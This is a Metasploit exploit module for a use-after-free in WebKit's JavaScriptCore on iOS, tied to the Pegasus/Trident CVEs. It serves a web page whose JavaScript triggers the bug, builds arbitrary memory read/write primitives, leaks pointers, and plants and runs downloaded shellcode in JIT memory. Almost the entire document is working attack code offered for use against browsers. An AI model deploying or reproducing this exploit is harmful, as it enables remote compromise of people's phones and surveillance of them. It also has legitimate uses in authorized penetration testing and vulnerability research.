##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WebKit not_number defineProperties UAF',
      'Description'    => %q{
          This module exploits a UAF vulnerability in WebKit's JavaScriptCore library.
      },
      'License'        => MSF_LICENSE,
      'Author'        => [
        'qwertyoruiop', # jbme.qwertyoruiop.com
        'siguza',       # PhoenixNonce
        'tihmstar',     # PhoenixNonce
        'timwr',        # metasploit integration
        ],
      'References'     => [
          ['CVE', '2016-4655'],
          ['CVE', '2016-4656'],
          ['CVE', '2016-4657'],
          ['URL', 'https://blog.lookout.com/trident-pegasus'],
          ['URL', 'https://citizenlab.ca/2016/08/million-dollar-dissident-iphone-zero-day-nso-group-uae/'],
          ['URL', 'https://www.blackhat.com/docs/eu-16/materials/eu-16-Bazaliy-Mobile-Espionage-in-the-Wild-Pegasus-and-Nation-State-Level-Attacks.pdf'],
          ['URL', 'https://github.com/Siguza/PhoenixNonce.git'],
          ['URL', 'https://jndok.github.io/2016/10/04/pegasus-writeup/'],
          ['URL', 'https://sektioneins.de/en/blog/16-09-02-pegasus-ios-kernel-vulnerability-explained.html'],
        ],
      'Arch'           => ARCH_AARCH64,
      'Platform'       => 'apple_ios',
      'DefaultTarget'  => 0,
      'Targets'        => [[ 'Automatic', {} ]],
      'DisclosureDate' => 'Aug 25 2016'))
    register_options(
      [
        OptPort.new('SRVPORT', [ true, "The local port to listen on.", 8080 ]),
        OptString.new('URIPATH', [ true, "The URI to use for this exploit.", "/" ])
      ])
  end

  def on_request_uri(cli, request)
    print_status("Request from #{request['User-Agent']}")
    if request.uri =~ /\/loader$/
      print_good("Target is vulnerable.")
      local_file = File.join( Msf::Config.data_directory, "exploits", "CVE-2016-4655", "loader" )
      loader_data = File.read(local_file, {:mode => 'rb'})
      send_response(cli, loader_data, {'Content-Type'=>'application/octet-stream'})
      return
    elsif request.uri =~ /\/exploit$/
      local_file = File.join( Msf::Config.data_directory, "exploits", "CVE-2016-4655", "exploit" )
      loader_data = File.read(local_file, {:mode => 'rb'})
      send_response(cli, loader_data, {'Content-Type'=>'application/octet-stream'})
      print_status("Sent exploit (#{loader_data.size} bytes)")
      return
    end
    html = %Q^
<html>
<body>
<script>
function console_log(text) {
  alert(text);
}
function load_binary_resource(url) {
  var req = new XMLHttpRequest();
  req.open('GET', url, false);
  req.overrideMimeType('text\/plain; charset=x-user-defined');
  req.send(null);
  if (req.status != 200) {
    document.write("fail downloading loader");
  }
  return req.responseText;
}
var mem0=0;
var mem1=0;
var mem2=0;

 function read4(addr) {
  mem0[4] = addr;
  var ret = mem2[0];
  mem0[4] = mem1;
  return ret;
 }

 function write4(addr, val) {
  mem0[4] = addr;
  mem2[0] = val;
  mem0[4] = mem1;
 }
 filestream = load_binary_resource("exploit")
 var shll = new Uint32Array(filestream.length / 4);
 for (var i = 0; i < filestream.length;) {
  var word = (filestream.charCodeAt(i) & 0xff) | ((filestream.charCodeAt(i + 1) & 0xff) << 8) | ((filestream.charCodeAt(i + 2) & 0xff) << 16) | ((filestream.charCodeAt(i + 3) & 0xff) << 24);
  shll[i / 4] = word;
  i += 4;
 }
_dview = null;
function u2d(low, hi) {
    if (!_dview) _dview = new DataView(new ArrayBuffer(16));
    _dview.setUint32(0, hi);
    _dview.setUint32(4, low);
    return _dview.getFloat64(0);
}

var pressure = new Array(400);
var bufs = new Array(10000);

var fcp = 0;
var smsh = new Uint32Array(0x10);

var trycatch = "";
for(var z=0; z<0x2000; z++) trycatch += "try{} catch(e){}; ";
var fc = new Function(trycatch);

function swag() {
	if(bufs[0]) return;

	dgc();

	for (i=0; i < bufs.length; i++) {
    bufs[i] = new Uint32Array(0x100*2)
		for (k=0; k < bufs[i].length; )
		{
			bufs[i][k++] = 0x41414141;
			bufs[i][k++] = 0xffff0000;
		}
	}
  console_log("doneswag");
}

function smashed(stale,tar_ptr,cydia_ptr,launchctl_ptr,offsets_ptr) {
  console_log("smsh len="+smsh.length);

  console_log("fcp=0x"+fcp.toString(16));
  console_log("binfile=0x"+binfile.toString(16));


  // getJIT
  r2 = smsh[(fcp+0x14)/4];
  r3 = smsh[(r2+0x10)/4];
  shellcode = (smsh[(r3+0x14)/4]&0xfffff000)-0x10000;
  console_log("r2=0x"+r2.toString(16));
  console_log("r3=0x"+r3.toString(16));
  console_log("shellcode=0x"+shellcode.toString(16));

  console_log("Plant payload3="+offsets_ptr.toString(16));
  smsh[shellcode/4] = offsets_ptr;
  shellcode += 4;

  console_log("Plant payload2="+launchctl_ptr.toString(16));
  smsh[shellcode/4] = launchctl_ptr;
  shellcode += 4;

  console_log("Plant payload1="+cydia_ptr.toString(16));
  smsh[shellcode/4] = cydia_ptr;
  shellcode += 4;

  console_log("Plant payload0="+tar_ptr.toString(16));
  smsh[shellcode/4] = tar_ptr;
  shellcode += 4;

  for(var i = 0; i < filestream.length; i+=4)
  {
    var word = (filestream.charCodeAt(i) & 0xff) | ((filestream.charCodeAt(i+1) & 0xff) << 8)  | ((filestream.charCodeAt(i+2) & 0xff) << 16)  | ((filestream.charCodeAt(i+3) & 0xff) << 24);
    smsh[(shellcode+i)/4] = word;
  }

  smsh[(fcp+0x00)/4] = fcp+4;
  smsh[(fcp+0x04)/4] = fcp+4;
  smsh[(fcp+0x08)/4] = shellcode+1; //PC
  smsh[(fcp+0x30)/4] = fcp+0x30+4-0x18-0x34+0x8;


  console_log("Do fc() smashed");
  fc();

  console_log("end smashed");
}

function sleep(delay) {
    var start = new Date().getTime();
    while (new Date().getTime() < start + delay);
}

dgc = function() {
  console_log("dgc start");
	for (var i = 0; i < pressure.length; i++) {
    pressure[i] = new Uint32Array(0xa000);
	}
  // sleep(1000);
  console_log("dgc done");
}
dgcf = function() {
  console_log("dgcf start");
	for (var i = 0; i < pressure.length; i++) {
		pressure[i] = 0
	}
  console_log("dgcf done");
}

go = function(){
  console_log("going");
  document.getElementById('bigButton').innerHTML = "Running stage 1 exploit";
  setTimeout(go_, 100);
}

function swag() {
	if(bufs[0]) return;

	dgc();

	for (i=0; i < bufs.length; i++) {
		bufs[i] = new Uint32Array(0x100*2)
		for (k=0; k < bufs[i].length; )
		{
			bufs[i][k++] = 0x41414141;
			bufs[i][k++] = 0xffff0000;
		}
	}
}

var binfile = 0;
function go_(){
  var arr = new Array(2047);
  var not_number = {};
  not_number.toString = function() {
  	arr = null;
  	props["stale"]["value"] = null;
    swag();
  	return 10;
  };

  smsh[0] = 0x21212121;
  smsh[1] = 0x31313131;
  smsh[2] = 0x41414141;
  smsh[3] = 0x51515151;
  smsh[4] = 0x61616161;
  smsh[5] = 0x71717171;
  smsh[6] = 0x81818181;
  smsh[7] = 0x91919191;

  var props = {
  	p0 : { value : 0 },
  	p1 : { value : 1 },
  	p2 : { value : 2 },
  	p3 : { value : 3 },
  	p4 : { value : 4 },
  	p5 : { value : 5 },
  	p6 : { value : 6 },
  	p7 : { value : 7 },
  	p8 : { value : 8 },
  	length : { value : not_number },
  	stale : { value : arr },
  	after : { value : 666 }
  };

  var target = [];
  var stale = 0;
  var before_len = arr.length;
  console_log("before="+before_len);
  Object.defineProperties(target, props);
  stale = target.stale;
  console_log("after="+stale.length);

  if (stale.length != 0x41414141){
    alert("exploit failed");
    location.reload();
    return;
  }

  var obuf = new Uint32Array(2);
  obuf[0] = 0x41414141;
  obuf[1] = 0xffff0000;

  stale[0] = 0x12345678;
  stale[1] = {};


  for(var z=0; z<0x100; z++) fc();

  console_log("pre array");
  for (i=0; i < bufs.length; i++) {
    var dobreak = 0;
    for (k=0; k < bufs[0].length; k++){
  	   if(bufs[i][k] != obuf[k%2]){

        console_log("bufs[i][k]  =0x"+bufs[i][k].toString(16));
        console_log("bufs[i][k+1]=0x"+bufs[i][k+1].toString(16));

        stale[0] = fc;
        fcp = bufs[i][k];

        stale[0] = filestream;
        binfile = bufs[i][k];

        stale[0] = smsh;
        var ptrsmsh = bufs[i][k];

        stale[2] = {'a':u2d(0x2,0x10),'b':smsh, 'c':u2d(0,0), 'd':u2d(0,0)}
        stale[0] = {'a':u2d(0,0x00e00600),'b':u2d(1,0x10), 'c':u2d(bufs[i][k+2*2]+0x10,0), 'd':u2d(0,0)}
        stale[1] = stale[0];
        bufs[i][k] += 0x10; // misalign so we end up in JSObject's properties, which have a crafted Uint32Array pointing to smsh
        var leak = stale[0][0].charCodeAt(0);
            leak += stale[0][1].charCodeAt(0) << 8;
            leak += stale[0][2].charCodeAt(0) << 16;
            leak += stale[0][3].charCodeAt(0) << 24;
        console_log("leakptr=0x"+leak.toString(16));
        bufs[i][k] -= 0x10;
        stale[0] = {'a':u2d(leak,0x00602300), 'b':u2d(0,0), 'c':smsh, 'd':u2d(0,0)}
        stale[1] = stale[0];
        bufs[i][k] += 0x10; // misalign so we end up in JSObject's properties, which have a crafted Uint32Array pointing to smsh
        stale[0][4] = 0;
        stale[0][5] = 0xffffffff;
        bufs[i][k] -= 0x10;

        mem0 = stale[0];
        mem2 = smsh;
        console_log("smsh.length=0x"+smsh.length.toString(16));

        if (smsh.length != 0x10) {
        }

        dobreak = 1;
        break;
       }
     }
     if (dobreak) break;
   }

  console_log("end");
}
setTimeout(go_, 100);
</script>
</body>
</html>
    ^
    send_response(cli, html, {'Content-Type'=>'text/html'})
  end

end
